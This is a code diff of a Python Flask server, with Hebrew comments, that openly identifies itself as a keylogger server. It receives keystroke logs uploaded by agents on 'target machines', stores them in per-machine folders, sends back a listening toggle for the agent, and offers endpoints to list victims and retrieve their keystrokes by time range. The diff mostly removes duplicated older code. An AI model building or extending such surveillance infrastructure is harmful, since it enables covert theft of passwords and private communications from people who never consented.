@@ -1,42 +1,11 @@
-import os
-import json
-import random
-from flask import Flask, request, jsonify
-from datetime import datetime
-from encryptor import Encryptor
-from flask_cors import CORS
-
-app = Flask(__name__)
-CORS(app)
-LOG_DIR = 'server_logs'                                                   # הגדרת נתיב לשמירת קבצי היומן
-
-def deep_merge(source, destination):
-    # מבצע מיזוג עמוק של מילונים מקוננים.
-
-    for key, value in source.items():
-        if isinstance(value, dict) and key in destination and isinstance(destination[key], dict):
-            # אם גם המפתח הקיים וגם החדש הם מילונים, קרא לפונקציה בצורה רקורסיבית
-            destination[key] = deep_merge(value, destination[key])
-        elif isinstance(value, str) and key in destination and isinstance(destination[key], str):
-            # אם הערך קיים והוא מחרוזת, שרשר את הערך החדש לקיים
-            destination[key] += value
-        else:
-            # אחרת, פשוט עדכן את הערך
-            destination[key] = value
-    return destination
-
-@app.route('/')
-def home():
-    """הוסף נקודת קצה מהשרת המרוחק"""
-    return "KeyLogger Server is Running"
-
 import os, json, random
 from datetime import time as dtime
 from flask import Flask, request, jsonify
 from flask_cors import CORS
 from utils import ptime, hour_from_fname, timekey, write_to_file
 
-app = Flask(__name__); CORS(app)
+app = Flask(__name__)
+CORS(app)
 LOG_DIR = 'server_logs'
 
 @app.get('/')
@@ -63,16 +32,16 @@ def notifications():
 
     return jsonify({"status": "success", "added": notification_text}),201
 
-
 @app.post('/api/upload')
 def save_data():
     status_listen = random.randint(0,1)
     if not request.is_json: return jsonify({"error":"Request must be JSON"}), 400
     data = request.get_json()
-    if not data: return jsonify({"data":False,"status_listen":status_listen}), 200
+    settings ={"status_listen":status_listen}                                         # כאן יכנסו כל המשתנים להגדרות לסוכן
+    if not data: return jsonify({"data":False, "settings": settings}), 200
     try:
         write_to_file(data, LOG_DIR)
-        return jsonify({"data":True,"status_listen":status_listen}), 200
+        return jsonify({"data":True, "settings": settings }), 200
     except Exception as e:
         return jsonify({"error":"Failed to save data","details":str(e)}), 500
 
@@ -110,87 +79,6 @@ def get_keystrokes():
         filtered = {k:v for k,v in obj.items() if (t:=timekey(k)) is None or (start_t <= t <= end_t)}
         if filtered: out.append(json.dumps(filtered, ensure_ascii=False, indent=2))
     return jsonify(out)
-
-if __name__ == '__main__':
-    app.run(debug=True, port=5000)
-@app.route('/api/upload', methods=['POST'])
-
-def save_data():
-    status_listen = random.randint(0, 1)                            # אופציה לעצירת האזנה נצרך להחליף לקלט מהמשתמש
-
-    if not request.is_json:                                               # בדוק אם הבקשה מכילה נתוני JSON
-        return jsonify({"error": "Request must5 be JSON"}), 400
-
-    data = request.get_json()                                             # קבל את הנתונים מהבקשה
-    try:
-        if not data:                                                      # במקום בדיקה עם {}, בודק אם המילון ריק או None
-            return jsonify({"data": False ,"status_listen": status_listen}), 200
-        write_to_file(data)                                               # קורא לפונקציה הייעודית לשמירת קבצים
-        return jsonify({"data": True ,"status_listen": status_listen}), 200
-    except Exception as e:
-        return jsonify({"error": "Failed to save data", "details": str(e)}), 500
-
-def write_to_file(data: dict):
-    encryptor = Encryptor()
-    data = encryptor.encrypt_dict(data)
-
-    machine_name = next(iter(data.keys()))                                  # שליפת שם המכונה ששלחה נתונים
-    data = data.pop(machine_name)
-    full_path = os.path.join(LOG_DIR, machine_name)                         #יצירת תקיה עם שם המכונה בתוך תקיה מותאמת
-    if not os.path.exists(full_path):
-        os.makedirs(full_path)
-
-    timestamp = datetime.now().strftime('%Y-%m-%d_%H')
-    filename = f"{timestamp}.json"
-
-    # יצירת שם קובץ ייחודי עם חותמת זמן
-    file_path = os.path.join(full_path, filename)
-    if not os.path.exists(file_path):
-        with open(file_path, 'w', encoding='utf-8') as f:  # שמירת הנתונים לקובץ JSON
-            date_data = next(iter(data.keys()))
-            data = data.pop(date_data)
-            json.dump(data, f, indent=4, ensure_ascii=False)  # המר את מילון הפייתון למחרוזת JSON
-            print(f"נתונים נשמרו בהצלחה לקובץ: {file_path}")
-    else:
-        with open(file_path, 'r', encoding='utf-8') as f:
-            data_file = json.load(f)
-            data_file = dict(data_file)
-            date_data = next(iter(data.keys()))
-            data = data.pop(date_data)
-        merged_data1 = deep_merge(data, data_file)
-        with open(file_path, 'w', encoding='utf-8') as f:
-            json.dump(merged_data1, f, indent=4, ensure_ascii=False)  # המר את מילון הפייתון למחרוזת JSON
-            print(f"נתונים נשמרו בהצלחה לקובץ: {file_path}")
-
-        print(json.dumps(merged_data1, indent=4, ensure_ascii=False))
-    return 200
-
-@app.route('/api/get_target_machines_list', methods=['GET'])
-def get_machines():
-    """הוסף נקודת קצה מהשרת המרוחק"""
-    if not os.path.exists(LOG_DIR):
-        return jsonify([])
-    machines = os.listdir(LOG_DIR)
-    return jsonify(machines)
-
-@app.route('/api/get_keystrokes', methods=['GET'])
-def get_keystrokes():
-    """הוסף נקודת קצה מהשרת המרוחק"""
-    machine = request.args.get("machine")
-    if not machine:
-        return jsonify({"error": "Missing machine"}), 400
-
-    machine_folder = os.path.join(LOG_DIR, machine)
-    if not os.path.exists(machine_folder):
-        return jsonify([])
-
-    files = sorted(os.listdir(machine_folder))
-    data = []
-    for file in files:
-        with open(os.path.join(machine_folder, file), "r", encoding="utf-8") as f:
-            data.append(f.read())
-
-    return jsonify(data)
 
 if __name__ == '__main__':
     app.run(debug=True, port=5000)
